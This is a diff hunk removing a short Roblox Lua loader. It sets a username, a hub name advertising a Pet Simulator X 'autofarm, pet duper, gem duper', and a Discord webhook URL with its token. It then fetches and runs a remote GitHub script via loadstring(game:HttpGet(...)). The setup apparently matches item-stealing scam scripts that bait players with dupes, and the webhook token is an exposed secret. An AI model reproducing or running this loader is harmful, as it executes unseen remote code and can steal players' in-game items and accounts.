@@ -1,5 +1,0 @@
-_G.Username "YT_BabyYodaGaming"
-_G.HubName "[Summer] Pet sim x AUTOFARM, PET DUPER,GEM DUPER"
-_G.WebhookUrl "https://discord.com/api/webhooks/1123992972376145942/uIrgJBjcGYybZAYiv3DVvjHFaj9HQGMXpnTL5oFTNL5A-JkusN2jmx6-NxaJS_fhAxdl"
-
-loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
